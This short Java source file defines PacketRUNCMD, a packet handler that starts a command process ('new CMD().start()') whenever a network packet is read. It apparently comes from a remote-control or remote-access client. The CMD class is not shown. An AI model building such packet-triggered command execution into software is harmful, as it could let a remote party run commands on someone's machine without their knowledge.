package com.redpois0n.packets;

import com.redpois0n.CMD;

public class PacketRUNCMD extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		new CMD().start();
	}

}
